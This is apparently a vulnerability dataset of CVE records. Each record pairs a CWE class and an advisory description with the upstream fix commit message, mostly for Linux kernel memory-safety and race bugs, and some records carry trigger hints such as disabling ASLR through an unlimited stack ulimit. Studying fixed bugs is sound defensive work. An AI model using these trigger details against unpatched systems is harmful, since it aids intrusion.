CVE-2014-9653,CWE-20,2015-03-30,"readelf.c in file before 5.22, as used in the Fileinfo component in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5, does not consider that pread calls sometimes read only a subset of the available data, which allows remote attackers to cause a denial of service (uninitialized memory access) or possibly have unspecified other impact via a crafted ELF file.",
CVE-2017-16932,CWE-835,2017-11-23,parser.c in libxml2 before 2.9.5 does not prevent infinite recursion in parameter entities.,"When expanding a parameter entity in a DTD, infinite recursion could lead to an infinite loop or memory exhaustion.  Thanks to Wei Lei for the first of many reports.  Fixes bug 759579."
CVE-2017-13083,CWE-295,2017-10-18,"Akeo Consulting Rufus prior to version 2.17.1187 does not adequately validate the integrity of updates downloaded over HTTP, allowing an attacker to easily convince a user to execute arbitrary code","* This commit effectively fixes https://www.kb.cert.org/vuls/id/403768 (CVE-2017-13083) as   it is described per its revision 11, which is the latest revision at the time of this commit,   by disabling Windows prompts, enacted during signature validation, that allow the user to   bypass the intended signature verification checks. * It needs to be pointed out that the vulnerability (""allow(ing) the use of a self-signed   certificate""), which relies on the end-user actively ignoring a Windows prompt that tells   them that the update failed the signature validation whilst also advising against running it,   is being fully addressed, even as the update protocol remains HTTP. * It also need to be pointed out that the extended delay (48 hours) between the time the   vulnerability was reported and the moment it is fixed in our codebase has to do with   the fact that the reporter chose to deviate from standard security practices by not   disclosing the details of the vulnerability with us, be it publicly or privately,   before creating the cert.org report. The only advance notification we received was a   generic note about the use of HTTP vs HTTPS, which, as have established, is not   immediately relevant to addressing the reported vulnerability. * Closes #1009 * Note: The other vulnerability scenario described towards the end of #1009, which   doesn't have to do with the ""lack of CA checking"", will be addressed separately."
CVE-2018-10675,CWE-416,2018-05-02,The do_get_mempolicy function in mm/mempolicy.c in the Linux kernel before 4.12.9 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted system calls.,"I hit a use after free issue when executing trinity and repoduced it with KASAN enabled.  The related call trace is as follows.    BUG: KASan: use after free in SyS_get_mempolicy+0x3c8/0x960 at addr ffff8801f582d766   Read of size 2 by task syz-executor1/798    INFO: Allocated in mpol_new.part.2+0x74/0x160 age=3 cpu=1 pid=799      __slab_alloc+0x768/0x970      kmem_cache_alloc+0x2e7/0x450      mpol_new.part.2+0x74/0x160      mpol_new+0x66/0x80      SyS_mbind+0x267/0x9f0      system_call_fastpath+0x16/0x1b   INFO: Freed in __mpol_put+0x2b/0x40 age=4 cpu=1 pid=799      __slab_free+0x495/0x8e0      kmem_cache_free+0x2f3/0x4c0      __mpol_put+0x2b/0x40      SyS_mbind+0x383/0x9f0      system_call_fastpath+0x16/0x1b   INFO: Slab 0xffffea0009cb8dc0 objects=23 used=8 fp=0xffff8801f582de40 flags=0x200000000004080   INFO: Object 0xffff8801f582d760 @offset=5984 fp=0xffff8801f582d600    Bytes b4 ffff8801f582d750: ae 01 ff ff 00 00 00 00 5a 5a 5a 5a 5a 5a 5a 5a  ........ZZZZZZZZ   Object ffff8801f582d760: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk   Object ffff8801f582d770: 6b 6b 6b 6b 6b 6b 6b a5                          kkkkkkk.   Redzone ffff8801f582d778: bb bb bb bb bb bb bb bb                          ........   Padding ffff8801f582d8b8: 5a 5a 5a 5a 5a 5a 5a 5a                          ZZZZZZZZ   Memory state around the buggy address:   ffff8801f582d600: fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc fc   ffff8801f582d680: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc   >ffff8801f582d700: fc fc fc fc fc fc fc fc fc fc fc fc fb fb fb fc  !shared memory policy is not protected against parallel removal by other thread which is normally protected by the mmap_sem.  do_get_mempolicy, however, drops the lock midway while we can still access it later.  Early premature up_read is a historical artifact from times when put_user was called in this path see https://lwn.net/Articles/124754/ but that is gone since 8bccd85 (""[PATCH] Implement sys_* do_* layering in the memory policy layer."").  but when we have the the current mempolicy ref count model.  The issue was introduced accordingly.  Fix the issue by removing the premature release.  Link: http://lkml.kernel.org/r/1502950924-27521-1-git-send-email-zhongjiang@huawei.com Signed-off-by: zhong jiang <zhongjiang@huawei.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: Minchan Kim <minchan@kernel.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: David Rientjes <rientjes@google.com> Cc: Mel Gorman <mgorman@techsingularity.net> Cc: <stable@vger.kernel.org>	[2.6+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-0196,CWE-362,2014-05-07,"The n_tty_write function in drivers/tty/n_tty.c in the Linux kernel through 3.14.3 does not properly manage tty driver access in the ""LECHO & !OPOST"" case, which allows local users to cause a denial of service (memory corruption and system crash) or gain privileges by triggering a race condition involving read and write operations with long strings.","The tty atomic_write_lock does not provide an exclusion guarantee for the tty driver if the termios settings are LECHO & !OPOST.  And since it is unexpected and not allowed to call TTY buffer helpers like tty_insert_flip_string concurrently, this may lead to crashes when concurrect writers call pty_write. In that case the following two writers: * the ECHOing from a workqueue and * pty_write from the process race and can overflow the corresponding TTY buffer like follows.  If we look into tty_insert_flip_string_fixed_flag, there is:   int space = __tty_buffer_request_room(port, goal, flags);   struct tty_buffer *tb = port->buf.tail;   ...   memcpy(char_buf_ptr(tb, tb->used), chars, space);   ...   tb->used += space;  so the race of the two can result in something like this:               A                                B __tty_buffer_request_room                                   __tty_buffer_request_room memcpy(buf(tb->used), ...) tb->used += space;                                   memcpy(buf(tb->used), ...) ->BOOM  B's memcpy is past the tty_buffer due to the previous A's tb->used increment.  Since the N_TTY line discipline input processing can output concurrently with a tty write, obtain the N_TTY ldisc output_lock to serialize echo output with normal tty writes.  This ensures the tty buffer helper tty_insert_flip_string is not called concurrently and everything is fine.  Note that this is nicely reproducible by an ordinary user using forkpty and some setup around that (raw termios + ECHO). And it is present in kernels at least after commit d945cb9 (pty: Rework the pty layer to use the normal buffering logic) in 2.6.31-rc3.  js: add more info to the commit log js: switch to bool js: lock unconditionally js: lock only the tty->ops->write call  References: CVE-2014-0196 Reported-and-tested-by: Jiri Slaby <jslaby@suse.cz> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Cc: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2015-7990,CWE-362,2015-12-28,Race condition in the rds_sendmsg function in net/rds/sendmsg.c in the Linux kernel before 4.3.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by using a socket that was not properly bound.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-6937.,"Sasha's found a NULL pointer dereference in the RDS connection code when sending a message to an apparently unbound socket.  The problem is caused by the code checking if the socket is bound in rds_sendmsg(), which checks the rs_bound_addr field without taking a lock on the socket.  This opens a race where rs_bound_addr is temporarily set but where the transport is not in rds_bind(), leading to a NULL pointer dereference when trying to dereference 'trans' in __rds_conn_create().  Vegard wrote a reproducer for this issue, so kindly ask him to share if you're interested.  I cannot reproduce the NULL pointer dereference using Vegard's reproducer with this patch, whereas I could without.  Complete earlier incomplete fix to CVE-2015-6937:    74e98eb (""RDS: verify the underlying transport exists before creating a connection"")  Cc: David S. Miller <davem@davemloft.net> Cc: stable@vger.kernel.org  Reviewed-by: Vegard Nossum <vegard.nossum@oracle.com> Reviewed-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3672,CWE-254,2016-04-27,"The arch_pick_mmap_layout function in arch/x86/mm/mmap.c in the Linux kernel through 4.5.2 does not properly randomize the legacy base address, which makes it easier for local users to defeat the intended restrictions on the ADDR_NO_RANDOMIZE flag, and bypass the ASLR protection mechanism for a setuid or setgid program, by disabling stack-consumption resource limits.","Currently on i386 and on X86_64 when emulating X86_32 in legacy mode, only the stack and the executable are randomized but not other mmapped files (libraries, vDSO, etc.). This patch enables randomization for the libraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.  By default on i386 there are 8 bits for the randomization of the libraries, vDSO and mmaps which only uses 1MB of VA.  This patch preserves the original randomness, using 1MB of VA out of 3GB or 4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.  The first obvious security benefit is that all objects are randomized (not only the stack and the executable) in legacy mode which highly increases the ASLR effectiveness, otherwise the attackers may use these non-randomized areas. But also sensitive setuid/setgid applications are more secure because currently, attackers can disable the randomization of these applications by setting the ulimit stack to ""unlimited"". This is a very old and widely known trick to disable the ASLR in i386 which has been allowed for too long.  Another trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE personality flag, but fortunately this doesn't work on setuid/setgid applications because there is security checks which clear Security-relevant flags.  This patch always randomizes the mmap_legacy_base address, removing the possibility to disable the ASLR by setting the stack to ""unlimited"".  Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es> Acked-by: Ismael Ripoll Ripoll <iripoll@upv.es> Acked-by: Kees Cook <keescook@chromium.org> Acked-by: Arjan van de Ven <arjan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: akpm@linux-foundation.org Cc: kees Cook <keescook@chromium.org> Link: http://lkml.kernel.org/r/1457639460-5242-1-git-send-email-hecmargi@upv.es Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2016-10229,CWE-358,2017-04-04,udp.c in the Linux kernel before 4.5 allows remote attackers to execute arbitrary code via UDP traffic that triggers an unsafe second checksum calculation during execution of a recv system call with the MSG_PEEK flag.,"Backport of this upstream commit into stable kernels : 89c22d8 (""net: Fix skb csum races when peeking"") exposed a bug in udp stack vs MSG_PEEK support, when user provides a buffer smaller than skb payload.  In this case, skb_copy_and_csum_datagram_iovec(skb, sizeof(struct udphdr),                                  msg->msg_iov); returns -EFAULT.  This bug does not happen in upstream kernels since Al Viro did a great job to replace this into : skb_copy_and_csum_datagram_msg(skb, sizeof(struct udphdr), msg); This variant is safe vs short buffers.  For the time being, instead reverting Herbert Xu patch and add back skb->ip_summed invalid changes, simply store the result of udp_lib_checksum_complete() so that we avoid computing the checksum a second time, and avoid the problematic skb_copy_and_csum_datagram_iovec() call.  This patch can be applied on recent kernels as it avoids a double checksumming, then backported to stable kernels as a bug fix.  Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-4564,CWE-119,2016-06-04,"The DrawImage function in MagickCore/draw.c in ImageMagick before 6.9.4-0 and 7.x before 7.0.1-2 makes an incorrect function call in attempting to locate the next token, which allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.",
CVE-2017-1000249,CWE-119,2017-09-11,An issue in file() was introduced in commit 9611f31313a93aa036389c5f3b15eea53510d4d1 (Oct 2016) lets an attacker overwrite a fixed 20 bytes stack buffer with a specially crafted .notes section in an ELF binary. This was fixed in commit 35c94dc6acc418f1ad7f6241a6680e5327495793 (Aug 2017).,
CVE-2017-8890,CWE-415,2017-05-10,The inet_csk_clone_lock function in net/ipv4/inet_connection_sock.c in the Linux kernel through 4.10.15 allows attackers to cause a denial of service (double free) or possibly have unspecified other impact by leveraging use of the accept system call.,"syzkaller found a way to trigger double frees from ip_mc_drop_socket()  It turns out that leave a copy of parent mc_list at accept() time, which is very bad.  Very similar to commit 8b485ce (""tcp: do not inherit fastopen_req from parent"")  Initial report from Pray3r, completed by Andrey one. Thanks a lot to them !  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Pray3r <pray3r.z@gmail.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-5287,CWE-59,2015-12-07,"The abrt-hook-ccpp help program in Automatic Bug Reporting Tool (ABRT) before 2.7.1 allows local users with certain permissions to gain privileges via a symlink attack on a file with a predictable name, as demonstrated by /var/tmp/abrt/abrt-hax-coredump or /var/spool/abrt/abrt-hax-coredump.","Prior this commit abrt-hook-ccpp saved a core file generated by a process running a program whose name starts with ""abrt"" in DUMP_LOCATION/$(basename program)-coredump. If the file was a symlink, the hook followed and wrote core file to the symlink's target.  Addresses CVE-2015-5287  Signed-off-by: Jakub Filak <jfilak@redhat.com>"
CVE-2016-2179,CWE-399,2016-09-16,"The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue entries associated with unused out-of-order messages, which allows remote attackers to cause a denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously, related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.",
CVE-2018-11506,CWE-787,2018-05-28,"The sr_do_ioctl function in drivers/scsi/sr_ioctl.c in the Linux kernel through 4.16.12 allows local users to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact because sense buffers have different sizes at the CDROM layer and the SCSI layer, as demonstrated by a CDROMREADMODE2 ioctl call.","We're casting the CDROM layer request_sense to the SCSI sense buffer, but the former is 64 bytes and the latter is 96 bytes. As we generally allocate these on the stack, we end up blowing up the stack.  Fix this by wrapping the scsi_execute() call with a properly sized sense buffer, and copying back the bits for the CDROM layer.  Cc: stable@vger.kernel.org Reported-by: Piotr Gabriel Kosinski <pg.kosinski@gmail.com> Reported-by: Daniel Shapira <daniel@twistlock.com> Tested-by: Kees Cook <keescook@chromium.org> Fixes: 82ed4db (""block: split scsi_request out of struct request"") Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2013-4387,CWE-119,2013-10-10,"net/ipv6/ip6_output.c in the Linux kernel through 3.11.4 does not properly determine the need for UDP Fragmentation Offload (UFO) processing of small packets after the UFO queueing of a large packet, which allows remote attackers to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact via network traffic that triggers a large response packet.","In the following scenario the socket is corked: If the first UDP packet is larger then the mtu we try to append it to the write queue via ip6_ufo_append_data. A following packet, which is smaller than the mtu would be appended to the already queued up gso-skb via plain ip6_append_data. This causes random memory corruptions.  In ip6_ufo_append_data we also have to be careful to not queue up the same skb multiple times. So setup the gso frame only when no first skb is available.  This also fixes a shortcoming where we add the current packet's length to cork->length but return early because of a packet > mtu with dontfrag set (instead of sutracting it again).  Found with trinity.  Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9806,CWE-362,2016-12-28,"Race condition in the netlink_dump function in net/netlink/af_netlink.c in the Linux kernel before 4.6.3 allows local users to cause a denial of service (double free) or possibly have unspecified other impact via a crafted application that makes sendmsg system calls, leading to a free operation associated with a new dump that started earlier than anticipated.","When we free cb->skb after a dump, we do it after releasing the lock.  This means that a new dump could have started in the time being and we'll end up freeing their skb instead of ours.  This patch saves the skb and module before we unlock so we free the right memory.  Fixes: 16b304f (""netlink: Eliminate kmalloc in netlink dump operation."") Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Acked-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-5940,CWE-269,2017-02-09,"Firejail before 0.9.44.6 and 0.9.38.x LTS before 0.9.38.10 LTS does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero, which allows local users to conduct sandbox-escape attacks via vectors involving a symlink and the --private option. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-5180.",
CVE-2017-11448,CWE-200,2017-07-19,The ReadJPEGImage function in coders/jpeg.c in ImageMagick before 7.0.6-1 allows remote attackers to obtain sensitive information from uninitialized memory locations via a crafted file.,
CVE-2019-15164,CWE-918,2019-10-03,rpcapd/daemon.c in libpcap before 1.9.1 allows SSRF because a URL may be provided as a capture source.,You shouldn't be able to ask a server to open a remote device on some *other* server; just open it yourself.  This addresses Include Security issue F13: [libpcap] Remote Packet Capture Daemon Allows Opening Capture URLs.
CVE-2019-15090,CWE-125,2019-08-16,"An issue was discovered in drivers/scsi/qedi/qedi_dbg.c in the Linux kernel before 5.1.12. In the qedi_dbg_* family of functions, there is an out-of-bounds read.","KASAN reports this:  BUG: KASAN: global-out-of-bounds in qedi_dbg_err+0xda/0x330 [qedi] Read of size 31 at addr ffffffffc12b0ae0 by task syz-executor.0/2429  CPU: 0 PID: 2429 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 Call Trace:  __dump_stack lib/dump_stack.c:77 [inline]  dump_stack+0xfa/0x1ce lib/dump_stack.c:113  print_address_description+0x1c4/0x270 mm/kasan/report.c:187  kasan_report+0x149/0x18d mm/kasan/report.c:317  memcpy+0x1f/0x50 mm/kasan/common.c:130  qedi_dbg_err+0xda/0x330 [qedi]  ? 0xffffffffc12d0000  qedi_init+0x118/0x1000 [qedi]  ? 0xffffffffc12d0000  ? 0xffffffffc12d0000  ? 0xffffffffc12d0000  do_one_initcall+0xfa/0x5ca init/main.c:887  do_init_module+0x204/0x5f6 kernel/module.c:3460  load_module+0x66b2/0x8570 kernel/module.c:3808  __do_sys_finit_module+0x238/0x2a0 kernel/module.c:3902  do_syscall_64+0x147/0x600 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007f2d57e55c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139 RAX: ffffffffffffffda RBX: 000000000073bfa0 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 00000000200003c0 RDI: 0000000000000003 RBP: 00007f2d57e55c70 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007f2d57e566bc R13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004  The buggy address belongs to the variable:  __func__.67584+0x0/0xffffffffffffd520 [qedi]  Memory state around the buggy address:  ffffffffc12b0980: fa fa fa fa 00 04 fa fa fa fa fa fa 00 00 05 fa  ffffffffc12b0a00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 05 fa fa > ffffffffc12b0a80: fa fa fa fa 00 06 fa fa fa fa fa fa 00 02 fa fa                                                           ^  ffffffffc12b0b00: fa fa fa fa 00 00 04 fa fa fa fa fa 00 00 03 fa  ffffffffc12b0b80: fa fa fa fa 00 00 02 fa fa fa fa fa 00 00 04 fa  Currently the qedi_dbg_* family of functions can overrun the end of the source string if it is less than the destination buffer length because of the use of a fixed sized memcpy. Remove the memset/memcpy calls to nfunc and just use func instead as it is always a null terminated string.  Reported-by: Hulk Robot <hulkci@huawei.com> Fixes: ace7f46 (""scsi: qedi: Add QLogic FastLinQ offload iSCSI driver framework."") Signed-off-by: YueHaibing <yuehaibing@huawei.com> Reviewed-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2013-7014,CWE-189,2013-12-09,Integer signedness error in the add_bytes_l2_c function in libavcodec/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.,Fixes out of array accesses Fixes Ticket2919  Found_by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2016-10318,CWE-264,2017-04-04,"A missing authorization check in the fscrypt_process_policy function in fs/crypto/policy.c in the ext4 and f2fs filesystem encryption support in the Linux kernel before 4.7.4 allows a user to assign an encryption policy to a directory owned by a different user, potentially creating a denial of service.","On an ext4 or f2fs filesystem with file encryption supported, a user could set an encryption policy on any empty directory(*) to which they had readonly access.  This is obviously problematic, since such a directory might be owned by another user and the new encryption policy would prevent that other user from creating files in their own directory (for example).  Fix this by requiring inode_owner_or_capable() permission to set an encryption policy.  This means that either the caller must own the file, or the caller must have the capability CAP_FOWNER.  (*) Or also on any regular file, for f2fs v4.6 and later and ext4     v4.8-rc1 and later; a separate bug fix is coming for that.  Signed-off-by: Eric Biggers <ebiggers@google.com> Cc: stable@vger.kernel.org # 4.1+; check fs/{ext4,f2fs} Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2011-4127,CWE-264,2012-07-03,"The Linux kernel before 3.2.2 does not properly restrict SG_IO ioctl calls, which allows local users to bypass intended restrictions on disk read and write operations by sending a SCSI command to (1) a partition block device or (2) an LVM volume.","Linux allows executing the SG_IO ioctl on a partition or LVM volume, and will pass the command to the underlying block device.  This is well-known, but it is also a large security problem when (via Unix permissions, ACLs, SELinux or a combination thereof) a program or user needs to be granted access only to part of the disk.  This patch lets partitions forward a small set of harmless ioctls; others are logged with printk so that we can see which ioctls are actually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred. Of course it was being sent to a (partition on a) hard disk, so it would have failed with ENOTTY and the patch isn't changing anything in practice.  Still, I'm treating it specially to avoid spamming the logs.  In principle, this restriction should include programs running with CAP_SYS_RAWIO.  If for example I let a program access /dev/sda2 and /dev/sdb, it still should not be able to read/write outside the boundaries of /dev/sda2 independent of the capabilities.  However, for now programs with CAP_SYS_RAWIO will still be allowed to send the ioctls.  Their actions will still be logged.  This patch does not affect the non-libata IDE driver.  That driver however already tests for bd != bd->bd_contains before issuing some ioctl; it could be restricted further to forbid these ioctls even for programs running with CAP_SYS_ADMIN/CAP_SYS_RAWIO.  Cc: linux-scsi@vger.kernel.org Cc: Jens Axboe <axboe@kernel.dk> Cc: James Bottomley <JBottomley@parallels.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com> [ Make it also print the command name when warning - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2012-6538,CWE-200,2013-03-15,"The copy_to_user_auth function in net/xfrm/xfrm_user.c in the Linux kernel before 3.6 uses an incorrect C library function for copying a string, which allows local users to obtain sensitive information from kernel heap memory by leveraging the CAP_NET_ADMIN capability.",copy_to_user_auth() fails to initialize the remainder of alg_name and therefore discloses up to 54 bytes of heap memory via netlink to userland.  Use strncpy() instead of strcpy() to fill the trailing bytes of alg_name with null bytes.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2013-4159,CWE-264,2014-08-06,"ctdb before 2.3 in OpenSUSE 12.3 and 13.1 does not create temporary files securely, which has unspecified impact related to ""several temp file vulnerabilities"" in (1) tcp/tcp_connect.c, (2) server/eventscript.c, (3) tools/ctdb_diagnostics, (4) config/gdb_backtrace, and (5) include/ctdb_private.h.",
CVE-2018-14361,CWE-20,2018-07-17,An issue was discovered in NeoMutt before 2018-07-16. nntp.c proceeds even if memory allocation fails for messages data.,
CVE-2017-9763,CWE-119,2017-06-19,"The grub_ext2_read_block function in fs/ext2.c in GNU GRUB before 2013-11-12, as used in shlr/grub/fs/ext2.c in radare2 1.5.0, allows remote attackers to cause a denial of service (excessive stack use and application crash) via a crafted binary file, related to use of a variable-size stack array.",
CVE-2013-0250,,2014-06-06,"The init_nss_hash function in exec/totemcrypto.c in Corosync 2.0 before 2.3 does not properly initialize the HMAC key, which allows remote attackers to cause a denial of service (crash) via a crafted packet.",Signed-off-by: Fabio M. Di Nitto <fdinitto@redhat.com> Reviewed-by: Jan Friesse <jfriesse@redhat.com>
CVE-2012-5517,,2012-12-21,The online_pages function in mm/memory_hotplug.c in the Linux kernel before 3.6 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact in opportunistic circumstances by using memory that was hot-added by an administrator.,"When online_pages() is called to add new memory to an empty zone, it rebuilds all zone lists by calling build_all_zonelists().  But there's a bug which prevents the new zone to be added to other nodes' zone lists.  online_pages() { 	build_all_zonelists() 	..... 	node_set_state(zone_to_nid(zone), N_HIGH_MEMORY) }  Here the node of the zone is put into N_HIGH_MEMORY state after calling build_all_zonelists(), but build_all_zonelists() only adds zones from nodes in N_HIGH_MEMORY state to the fallback zone lists. build_all_zonelists()      ->__build_all_zonelists() 	->build_zonelists() 	    ->find_next_best_node() 		->for_each_node_state(n, N_HIGH_MEMORY)  So memory in the new zone will never be used by other nodes, and it may cause strange behavor when system is under memory pressure.  So put node into N_HIGH_MEMORY state before calling build_all_zonelists().  Signed-off-by: Jianguo Wu <wujianguo@huawei.com> Signed-off-by: Jiang Liu <liuj97@gmail.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Michal Hocko <mhocko@suse.cz> Cc: Minchan Kim <minchan@kernel.org> Cc: Rusty Russell <rusty@rustcorp.com.au> Cc: Yinghai Lu <yinghai@kernel.org> Cc: Tony Luck <tony.luck@intel.com> Cc: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Cc: David Rientjes <rientjes@google.com> Cc: Keping Chen <chenkeping@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-6794,CWE-693,2018-02-07,"Suricata before 4.0.4 is prone to an HTTP detection bypass vulnerability in detect.c and stream-tcp.c. If a malicious server breaks a normal TCP flow and sends data before the 3-way handshake is complete, then the data sent by the malicious server will be accepted by web clients such as a web browser or Linux CLI utilities, but ignored by Suricata IDS signatures. This mostly affects IDS signatures for the HTTP protocol and TCP stream content; signatures for TCP packets will inspect such network traffic as usual.",
CVE-2017-13000,CWE-125,2017-09-14,The IEEE 802.15.4 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_15_4.c:ieee802_15_4_if_print().,"While we're at it, add a bunch of macros for the frame control field's subfields, have the reserved frame types show the frame type value, use the same code path for processing source and destination addresses regardless of whether -v was specified (just leave out the addresses in non-verbose mode), and return the header length in all cases.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s)."
CVE-2018-9988,CWE-125,2018-04-10,"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_key_exchange() that could cause a crash on invalid input.",
CVE-2017-16528,CWE-416,2017-11-04,sound/core/seq_device.c in the Linux kernel before 4.13.4 allows local users to cause a denial of service (snd_rawmidi_dev_seq_free use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device.,"ALSA sequencer core has a mechanism to load the enumerated devices automatically, and it's performed in an off-load work.  This seems causing some race when a sequencer is removed while the pending autoload work is running.  As syzkaller spotted, it may lead to some use-after-free:   BUG: KASAN: use-after-free in snd_rawmidi_dev_seq_free+0x69/0x70   sound/core/rawmidi.c:1617   Write of size 8 at addr ffff88006c611d90 by task kworker/2:1/567    CPU: 2 PID: 567 Comm: kworker/2:1 Not tainted 4.13.0+ #29   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011   Workqueue: events autoload_drivers   Call Trace:    __dump_stack lib/dump_stack.c:16 [inline]    dump_stack+0x192/0x22c lib/dump_stack.c:52    print_address_description+0x78/0x280 mm/kasan/report.c:252    kasan_report_error mm/kasan/report.c:351 [inline]    kasan_report+0x230/0x340 mm/kasan/report.c:409    __asan_report_store8_noabort+0x1c/0x20 mm/kasan/report.c:435    snd_rawmidi_dev_seq_free+0x69/0x70 sound/core/rawmidi.c:1617    snd_seq_dev_release+0x4f/0x70 sound/core/seq_device.c:192    device_release+0x13f/0x210 drivers/base/core.c:814    kobject_cleanup lib/kobject.c:648 [inline]    kobject_release lib/kobject.c:677 [inline]    kref_put include/linux/kref.h:70 [inline]    kobject_put+0x145/0x240 lib/kobject.c:694    put_device+0x25/0x30 drivers/base/core.c:1799    klist_devices_put+0x36/0x40 drivers/base/bus.c:827    klist_next+0x264/0x4a0 lib/klist.c:403    next_device drivers/base/bus.c:270 [inline]    bus_for_each_dev+0x17e/0x210 drivers/base/bus.c:312    autoload_drivers+0x3b/0x50 sound/core/seq_device.c:117    process_one_work+0x9fb/0x1570 kernel/workqueue.c:2097    worker_thread+0x1e4/0x1350 kernel/workqueue.c:2231    kthread+0x324/0x3f0 kernel/kthread.c:231    ret_from_fork+0x25/0x30 arch/x86/entry/entry_64.S:425  The fix is simply to assure canceling the autoload work at removing the device.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
